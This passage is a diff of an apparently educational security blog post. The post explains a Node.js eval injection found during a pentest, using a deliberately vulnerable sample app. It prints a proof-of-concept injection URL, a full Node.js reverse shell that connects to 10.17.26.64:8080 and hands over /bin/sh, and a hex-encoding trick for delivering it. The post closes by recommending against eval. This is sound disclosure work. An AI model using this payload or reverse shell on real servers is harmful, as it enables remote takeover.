@@ -63,18 +63,18 @@ We also noticed that the redis server was accessible from the WAN without authen
 <h2 id="simplified-vulnerable-application" style="position:relative;"><a href="#simplified-vulnerable-application" aria-label="simplified vulnerable application permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Simplified vulnerable application</h2>
 <p>We created this small Node.js application with the vulnerable function if you want to try to exploit it yourself.
 This Node.js web server will wait for a query such as <code class="language-text">http://target.tld//?name=do*</code> and search for animal names matching that query.</p>
-<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">'use strict'
-const http = require('http');
-const url = require('url');
-const path = require('path');
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">&#39;use strict&#39;
+const http = require(&#39;http&#39;);
+const url = require(&#39;url&#39;);
+const path = require(&#39;path&#39;);
 
-const animalsJSON = path.join(__dirname, 'animals.json');
+const animalsJSON = path.join(__dirname, &#39;animals.json&#39;);
 const animals = require(animalsJSON);
 
 function requestHandler(req, res) {
     let urlParams = url.parse(req.url, true);
     let queryData = urlParams.query;
-    res.writeHead(200, {"Content-Type": "application/json"});
+    res.writeHead(200, {&quot;Content-Type&quot;: &quot;application/json&quot;});
 
     if (queryData.name) {
         let searchQuery = stringToRegexp(queryData.name);
@@ -97,23 +97,23 @@ function getAnimals(query) {
 }
 
 function stringToRegexp(input) {
-    let output = input.replace(/[\[\]\\\^\$\.\|\?\+\(\)]/, "\\$&amp;");
+    let output = input.replace(/[\[\]\\\^\$\.\|\?\+\(\)]/, &quot;\\$&amp;&quot;);
     let prefix, suffix;
 
-    if (output[0] == '*') {
-        prefix = '/';
-        output = output.replace(/^\*+/g, '');
+    if (output[0] == &#39;*&#39;) {
+        prefix = &#39;/&#39;;
+        output = output.replace(/^\*+/g, &#39;&#39;);
     } else {
-        prefix = '/^';
+        prefix = &#39;/^&#39;;
     }
 
-    if (output[output.length - 1] == '*') {
-        suffix = '/i';
-        output = output.replace(/\*+$/g, '');
+    if (output[output.length - 1] == &#39;*&#39;) {
+        suffix = &#39;/i&#39;;
+        output = output.replace(/\*+$/g, &#39;&#39;);
     } else {
-        suffix = '$/i';
+        suffix = &#39;$/i&#39;;
     }
-    output = output.replace(/[\*]/, '.*');
+    output = output.replace(/[\*]/, &#39;.*&#39;);
 
     return eval(prefix + output + suffix);
 }
@@ -121,15 +121,15 @@ function stringToRegexp(input) {
 const server = http.createServer(requestHandler);
 server.listen(3000);</code></pre></div>
 <div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">[
-    {"name": "Dinosaur"},
-    {"name": "Dog"},
-    {"name": "Dogfish"},
-    {"name": "Dolphin"},
-    {"name": "Donkey"},
-    {"name": "Dotterel"},
-    {"name": "Dove"},
-    {"name": "Dragonfly"},
-    {"name": "Duck"}
+    {&quot;name&quot;: &quot;Dinosaur&quot;},
+    {&quot;name&quot;: &quot;Dog&quot;},
+    {&quot;name&quot;: &quot;Dogfish&quot;},
+    {&quot;name&quot;: &quot;Dolphin&quot;},
+    {&quot;name&quot;: &quot;Donkey&quot;},
+    {&quot;name&quot;: &quot;Dotterel&quot;},
+    {&quot;name&quot;: &quot;Dove&quot;},
+    {&quot;name&quot;: &quot;Dragonfly&quot;},
+    {&quot;name&quot;: &quot;Duck&quot;}
 ]</code></pre></div>
 <h2 id="the-vulnerability" style="position:relative;"><a href="#the-vulnerability" aria-label="the vulnerability permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>The vulnerability</h2>
 <p>After a few minutes of analyzing the buggy endpoints in the code we noticed a bad practice issue that could lead to remote code execution.
@@ -137,19 +137,19 @@ The <code class="language-text">stringToRegexp</code> function is evaluating use
 <div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">return eval(prefix + output + suffix); // we control output value</code></pre></div>
 <p>We can insert our own Javascript code in the output variable and execute it.
 The stringToRegexp function will escape some characters and the output value will be evaluated.</p>
-<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">["./;require('util').log('Owned');//*"]</code></pre></div>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">[&quot;./;require(&#39;util&#39;).log(&#39;Owned&#39;);//*&quot;]</code></pre></div>
 <p>Visiting the address below will print a message on the server terminal.
-<code class="language-text">http://target.tld/?name=["./;require('util').log('Owned');//*"]</code></p>
+<code class="language-text">http://target.tld/?name=[&quot;./;require(&#39;util&#39;).log(&#39;Owned&#39;);//*&quot;]</code></p>
 <p>From there it would be nice to execute code to have an interactive shell such as <code class="language-text">/bin/sh</code>.</p>
 <h2 id="the-nodejs-reverse-shell" style="position:relative;"><a href="#the-nodejs-reverse-shell" aria-label="the nodejs reverse shell permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>The Node.js reverse shell</h2>
 <p>The Javascript code below is a Node.js reverse shell.
 The payload will spawn a /bin/sh shell, create a TCP connection to the attacker and attach the shell standard streams to it.</p>
 <div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">(function(){
-    var net = require("net"),
-        cp = require("child_process"),
-        sh = cp.spawn("/bin/sh", []);
+    var net = require(&quot;net&quot;),
+        cp = require(&quot;child_process&quot;),
+        sh = cp.spawn(&quot;/bin/sh&quot;, []);
     var client = new net.Socket();
-    client.connect(8080, "10.17.26.64", function(){
+    client.connect(8080, &quot;10.17.26.64&quot;, function(){
         client.pipe(sh.stdin);
         sh.stdout.pipe(client);
         sh.stderr.pipe(client);
@@ -157,7 +157,7 @@ The payload will spawn a /bin/sh shell, create a TCP connection to the attacker 
     return /a/; // Prevents the Node.js application form crashing
 })();</code></pre></div>
 <p>To execute the payload gracefully we used a little trick, we encoded our reverse shell payload to hexadecimal and used the Node.js Buffer object to decode it.
-<code class="language-text">http://target.tld/?name=["./;eval(new Buffer('PAYLOAD', 'hex').toString());//*"]</code></p>
+<code class="language-text">http://target.tld/?name=[&quot;./;eval(new Buffer(&#39;PAYLOAD&#39;, &#39;hex&#39;).toString());//*&quot;]</code></p>
 <h2 id="conclusion" style="position:relative;"><a href="#conclusion" aria-label="conclusion permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Conclusion</h2>
 <p>It’s highly recommended to avoid using the <code class="language-text">eval</code> function in a Javascript project.
 The fix was rather simple, they started using using the <code class="language-text">RegExp</code> object directly.
